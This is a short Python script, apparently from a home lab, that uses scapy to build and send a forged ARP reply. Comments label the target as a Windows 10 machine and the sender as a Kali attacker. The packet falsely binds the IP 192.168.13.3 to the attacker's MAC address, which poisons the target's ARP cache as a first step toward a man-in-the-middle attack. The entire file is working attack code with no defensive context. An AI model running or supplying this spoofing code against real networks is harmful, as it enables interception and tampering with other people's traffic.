from scapy.all import *
from scapy.layers.l2 import ARP

my_arp_response = ARP()

my_arp_response.op = 2
my_arp_response.pdst = "192.168.13.128"         # TARGET MACHINE : WINDOWS 10 IP ADDRESS
my_arp_response.hwdst = "00:0c:29:9d:d9:97"     # TARGET MACHINE : WINDOWS 10 MAC ADDRESS
my_arp_response.hwsrc = "00:0c:29:97:05:57"     # ATTACKER MACHINE : KALI MAC ADDRESS
my_arp_response.psrc = "192.168.13.3"

print(my_arp_response.show())
send(my_arp_response)
